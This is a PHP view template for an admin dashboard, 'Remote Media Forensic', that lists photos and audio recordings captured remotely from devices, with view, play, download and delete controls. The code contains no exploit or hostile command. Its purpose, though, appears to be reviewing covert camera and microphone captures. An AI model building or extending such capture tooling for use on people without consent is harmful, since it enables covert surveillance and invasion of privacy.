<?php /** @var array $rows @var int $total @var string $nav_urls */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-photo-video text-primary mr-2"></i>Remote Media Forensic</h1>
                        <span class="badge badge-primary border p-2"><i class="fas fa-database mr-1"></i>Total: <b><?= $total ?? 0 ?></b></span>
                    </div>
                    <p class="text-muted mt-1 mb-0">Multimedia files captured remotely via device commands</p>
                </div>
                <div class="col-lg-5 text-right"><?= $nav_urls ?></div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                    <div class="card card-primary card-outline shadow-sm">
                        <div class="card-header">
                            <h3 class="card-title"><i class="fas fa-list mr-2"></i>Media Evidence <small class="text-muted ml-2"><?= count($rows) ?> entries</small></h3>
                            <div class="card-tools">
                                <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i></button>
                            </div>
                        </div>
                        <div class="card-body p-0">
                            <div class="table-responsive">
                                <table class="table table-hover table-striped mb-0">
                                    <thead class="thead-light">
                                        <tr>
                                            <th><i class="fas fa-file-invoice mr-1"></i>File Info</th>
                                            <th><i class="fas fa-tag mr-1"></i>Type</th>
                                            <th><i class="fas fa-hdd mr-1"></i>Size</th>
                                            <th><i class="fas fa-calendar-alt mr-1"></i>Captured At</th>
                                            <th class="text-right"><i class="fas fa-cogs mr-1"></i>Action</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php if (empty($rows)): ?>
                                            <tr>
                                                <td colspan="5" class="text-center py-5">
                                                    <div class="empty-state">
                                                        <i class="fas fa-photo-video fa-3x text-muted mb-3"></i>
                                                        <h4>No media captured yet</h4>
                                                        <p class="text-muted">Captured photos and audio recordings will appear here</p>
                                                    </div>
                                                </td>
                                            </tr>
                                        <?php else: foreach ($rows as $r): ?>
                                            <tr>
                                                <td>
                                                    <div class="d-flex align-items-center">
                                                        <div class="adv-avatar mr-2">
                                                            <i class="<?= ($r['media_type'] === 'image') ? 'fas fa-image text-info' : 'fas fa-microphone text-danger' ?>"></i>
                                                        </div>
                                                        <div>
                                                            <div class="font-weight-bold"><?= htmlspecialchars($r['original_filename'] ?? '—') ?></div>
                                                            <small class="text-muted"><?= htmlspecialchars($r['mime_type'] ?? '') ?></small>
                                                        </div>
                                                    </div>
                                                </td>
                                                <td>
                                                    <span class="badge badge-<?= ($r['media_type'] === 'image') ? 'info' : 'danger' ?>">
                                                        <?= strtoupper($r['media_type']) ?>
                                                    </span>
                                                </td>
                                                <td>
                                                    <code><?= number_format(($r['file_size'] ?? 0) / 1024, 2) ?> KB</code>
                                                </td>
                                                <td>
                                                    <small class="text-dark font-weight-bold"><?= date('M d, Y, H:i (l)', strtotime($r['created_at'])) ?></small>
                                                </td>
                                                <td class="text-right">
                                                    <?php if ($r['media_type'] === 'image'): ?>
                                                        <button class="btn btn-sm btn-outline-info view-media" 
                                                                data-type="image" 
                                                                data-url="<?= base_url('advanced/media/serve/' . $r['stored_filename']) ?>"
                                                                data-title="<?= htmlspecialchars($r['original_filename']) ?>">
                                                            <i class="fas fa-eye mr-1"></i> View
                                                        </button>
                                                    <?php else: ?>
                                                        <button class="btn btn-sm btn-outline-danger view-media" 
                                                                data-type="audio" 
                                                                data-url="<?= base_url('advanced/media/serve/' . $r['stored_filename']) ?>"
                                                                data-title="<?= htmlspecialchars($r['original_filename']) ?>">
                                                            <i class="fas fa-play mr-1"></i> Play
                                                        </button>
                                                    <?php endif; ?>
                                                    <a href="<?= base_url('advanced/media/serve/' . $r['stored_filename']) ?>" class="btn btn-sm btn-outline-secondary" download title="Download">
                                                        <i class="fas fa-download"></i>
                                                    </a>
                                                    <button class="btn btn-sm btn-outline-danger delete-media" 
                                                            data-id="<?= $r['id'] ?>" 
                                                            data-filename="<?= htmlspecialchars($r['original_filename']) ?>"
                                                            title="Delete">
                                                        <i class="fas fa-trash"></i>
                                                    </button>
                                                </td>
                                            </tr>
                                        <?php endforeach; endif; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="card-footer clearfix">
                            <div class="float-right">
                                <?php if (isset($pager)): ?>
                                    <?= $pager->links('default', 'bootstrap5_full') ?>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>

<!-- Image View Modal -->
<div class="modal fade" id="imageModal" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="imageModalTitle">Image Viewer</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body text-center">
                <img src="" id="modalImage" class="img-fluid rounded shadow" style="max-height: 80vh;">
            </div>
        </div>
    </div>
</div>

<!-- Audio Player Modal -->
<div class="modal fade" id="audioModal" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="audioModalTitle">Audio Player</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body text-center py-4">
                <div class="mb-3">
                    <i class="fas fa-microphone-alt fa-3x text-danger mb-3"></i>
                    <h6 id="audioFilename" class="font-weight-bold"></h6>
                </div>
                <audio id="modalAudio" controls class="w-100" src="">
                    Your browser does not support the audio element.
                </audio>
            </div>
        </div>
    </div>
</div>

<!-- Toastr CSS & JS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

<!-- SweetAlert2 -->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script>
$(function() {
    $('.view-media').on('click', function() {
        const type = $(this).data('type');
        const url = $(this).data('url');
        const title = $(this).data('title');

        if (type === 'image') {
            $('#modalImage').attr('src', url);
            $('#imageModalTitle').text(title);
            $('#imageModal').modal('show');
        } else if (type === 'audio') {
            const audio = document.getElementById('modalAudio');
            audio.src = url;
            audio.load();
            $('#audioModalTitle').text('Playing: ' + title);
            $('#audioFilename').text(title);
            $('#audioModal').modal('show');
            
            // Auto play when modal shows
            $('#audioModal').on('shown.bs.modal', function () {
                audio.play().catch(e => console.log("Autoplay blocked or error:", e));
            });
        }
    });

    // Delete Media Logic
    $('.delete-media').on('click', function() {
        const id = $(this).data('id');
        const filename = $(this).data('filename');
        const $row = $(this).closest('tr');

        Swal.fire({
            title: 'Are you sure?',
            text: `You are about to delete "${filename}". This action cannot be undone!`,
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#d33',
            cancelButtonColor: '#3085d6',
            confirmButtonText: 'Yes, delete it!',
            showLoaderOnConfirm: true,
            preConfirm: () => {
                return $.ajax({
                    url: `<?= base_url('advanced/media/delete') ?>/${id}`,
                    method: 'POST',
                    dataType: 'json'
                }).catch(error => {
                    Swal.showValidationMessage(`Request failed: ${error.responseJSON?.message || error.statusText}`);
                });
            },
            allowOutsideClick: () => !Swal.isLoading()
        }).then((result) => {
            if (result.isConfirmed) {
                $row.fadeOut(400, function() {
                    $(this).remove();
                    // Update total count in UI
                    const $totalBadge = $('.badge-primary b');
                    const newTotal = parseInt($totalBadge.text()) - 1;
                    $totalBadge.text(newTotal);
                    
                    if ($('tbody tr').length === 0) {
                        location.reload(); // Reload to show empty state if last row deleted
                    }
                });
                toastr.success('File and record deleted successfully');
            }
        });
    });

    // Pause audio when modal is closed
    $('#audioModal').on('hidden.bs.modal', function () {
        const audio = document.getElementById('modalAudio');
        audio.pause();
        audio.currentTime = 0;
    });
});
</script>

<?php include __DIR__ . '/_adv_style.php'; ?>
